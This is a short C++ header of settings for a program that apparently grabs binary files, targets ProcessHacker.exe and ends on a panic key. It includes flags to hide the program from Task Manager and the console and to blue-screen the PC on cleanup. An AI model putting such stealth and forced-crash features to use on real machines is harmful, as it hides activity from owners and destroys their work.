#include <windows.h>
#pragma once

struct settings_ {

    // best to ingore it as you will grab too many bins files. However some firmware will place in windows on purpose to avoid this grabber.
    bool ignoreWindowsFolder = true;

    // Key to end the program.
    int panicKey = VK_INSERT;

    // Hide the program from the task manager & The Console.
    bool hideProgram = false;

    // blue screens pc instead of exiting on cleanup
    bool BSOD = false;


    const WCHAR* target_process = L"ProcessHacker.exe";

}settings;
